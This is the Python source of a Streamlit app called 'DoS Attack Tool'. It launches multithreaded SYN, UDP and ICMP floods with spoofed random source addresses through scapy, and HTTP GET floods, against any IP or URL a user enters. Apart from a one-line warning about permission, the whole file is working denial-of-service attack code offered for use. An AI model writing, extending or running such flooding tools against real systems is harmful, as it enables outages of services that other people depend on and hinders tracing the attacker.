import streamlit as st
import ipaddress
import time
from random import randint
import string
import random
from scapy.all import IP, TCP, UDP, ICMP, send
from concurrent.futures import ThreadPoolExecutor, as_completed
import requests

# Utility Functions
def randomIP():
    """Generate a random IPv4 address."""
    return ".".join(str(randint(1, 255)) for _ in range(4))

def randInt():
    """Generate a random integer between 1000 and 9000."""
    return randint(1000, 9000)

def random_string(length):
    """Generate a random string of specified length."""
    return ''.join(random.choice(string.ascii_letters) for _ in range(length))

def validate_ip(ip):
    """Validate an IPv4 address."""
    try:
        ipaddress.ip_address(ip)
        return True
    except ValueError:
        return False

def validate_url(url):
    """Validate a URL (basic check for HTTP/HTTPS)."""
    return url.startswith(('http://', 'https://'))

# Flood Functions
def SYN_Flood(dstIP, dstPort, count, rate_limit):
    """Perform a SYN flood attack."""
    sent = 0
    errors = 0
    for i in range(count):
        try:
            pkt = IP(src=randomIP(), dst=dstIP) / \
                  TCP(sport=randInt(), dport=dstPort,
                      flags="S", seq=randInt(), window=randInt())
            send(pkt, verbose=0)
            sent += 1
        except Exception:
            errors += 1
        if rate_limit > 0:
            time.sleep(1 / rate_limit)
    return sent, errors

def UDP_Flood(dstIP, dstPort, count, rate_limit):
    """Perform a UDP flood attack with random payloads."""
    sent = 0
    errors = 0
    for i in range(count):
        try:
            pkt = IP(src=randomIP(), dst=dstIP) / \
                  UDP(sport=randInt(), dport=dstPort) / \
                  random_string(100)  # 100-byte random payload
            send(pkt, verbose=0)
            sent += 1
        except Exception:
            errors += 1
        if rate_limit > 0:
            time.sleep(1 / rate_limit)
    return sent, errors

def ICMP_Flood(dstIP, count, rate_limit):
    """Perform an ICMP flood attack (ping flood)."""
    sent = 0
    errors = 0
    for i in range(count):
        try:
            pkt = IP(src=randomIP(), dst=dstIP) / ICMP()
            send(pkt, verbose=0)
            sent += 1
        except Exception:
            errors += 1
        if rate_limit > 0:
            time.sleep(1 / rate_limit)
    return sent, errors

def HTTP_Flood(url, count, rate_limit):
    """Perform an HTTP flood attack using GET requests."""
    sent = 0
    errors = 0
    headers = {'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'}
    for i in range(count):
        try:
            response = requests.get(url, headers=headers, timeout=5)
            sent += 1
        except requests.RequestException:
            errors += 1
        if rate_limit > 0:
            time.sleep(1 / rate_limit)
    return sent, errors

# Threaded Flood Wrapper
def Flood_Threaded(attack_type, target, port, total_packets, threads, rate_limit):
    """Execute the specified flood attack using multiple threads."""
    per_thread = total_packets // threads
    futures = []
    with ThreadPoolExecutor(max_workers=threads) as exe:
        for _ in range(threads):
            if attack_type == "SYN":
                futures.append(exe.submit(SYN_Flood, target, port, per_thread, rate_limit))
            elif attack_type == "UDP":
                futures.append(exe.submit(UDP_Flood, target, port, per_thread, rate_limit))
            elif attack_type == "ICMP":
                futures.append(exe.submit(ICMP_Flood, target, per_thread, rate_limit))
            elif attack_type == "HTTP":
                futures.append(exe.submit(HTTP_Flood, target, per_thread, rate_limit))
    return [f.result() for f in as_completed(futures)]

# Streamlit UI
st.title("💥 DoS Attack Tool")

st.warning("⚠️ Only test systems you own or have explicit permission to test! Unauthorized use may be illegal.")

attack_type = st.selectbox("Attack Type", ["SYN", "UDP", "ICMP", "HTTP"])

if attack_type in ["SYN", "UDP", "ICMP"]:
    target = st.text_input("Target IP")
    port = st.number_input("Target Port", 1, 65535, 80, disabled=attack_type == "ICMP")
elif attack_type == "HTTP":
    target = st.text_input("Target URL (e.g., http://example.com)")
    port = None  # Not used for HTTP

total_pkts = st.number_input("Packet/Request Count", 1, 1000000, 1000)
threads = st.number_input("Threads", 1, 100, 10)
rate_limit = st.number_input("Rate Limit (pkts or reqs/sec per thread)", 0, 10000, 100)

if st.button("Launch Attack"):
    # Input validation
    if attack_type in ["SYN", "UDP", "ICMP"] and not validate_ip(target):
        st.error("❌ Invalid IP address!")
    elif attack_type == "HTTP" and not validate_url(target):
        st.error("❌ Invalid URL! Must start with http:// or https://")
    else:
        target_desc = f"{target}:{port}" if attack_type in ["SYN", "UDP"] else target
        st.info(f"Launching {attack_type} flood on {target_desc} — {total_pkts} pkts/reqs, {threads} threads, {rate_limit} pps/rps")
        with st.spinner("Attack in progress…"):
            results = Flood_Threaded(attack_type, target, port, total_pkts, threads, rate_limit)

        # Display results
        st.success(f"✅ {attack_type} Attack completed!")
        total_sent = sum(s for s, _ in results)
        total_err = sum(e for _, e in results)

        st.subheader("📊 Thread Results")
        for idx, (s, e) in enumerate(results, 1):
            st.text(f"Thread {idx}: Sent={s}, Errors={e}")

        st.write(f"**Total packets/requests sent:** {total_sent}")
        st.write(f"**Total errors:** {total_err}")